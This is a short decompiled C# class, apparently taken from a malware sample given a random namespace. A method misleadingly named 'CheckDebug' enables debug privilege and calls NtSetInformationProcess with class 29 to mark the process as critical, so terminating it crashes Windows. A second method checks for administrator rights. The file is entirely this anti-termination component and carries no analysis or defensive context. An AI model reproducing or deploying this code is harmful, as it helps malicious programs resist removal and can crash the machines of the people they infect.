using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace MufMaOSvGyvz
{
	// Token: 0x0200000E RID: 14
	public static class Debug
	{
		// Token: 0x0600003E RID: 62
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern int NtSetInformationProcess(IntPtr intptr_0, int int_0, ref int int_1, int int_2);

		// Token: 0x0600003F RID: 63
		public static void CheckDebug()
		{
			int num = 1;
			Process.EnterDebugMode();
			Debug.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref num, 4);
		}

		// Token: 0x06000040 RID: 64
		public static bool CheckAdminRights()
		{
			return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
		}
	}
}
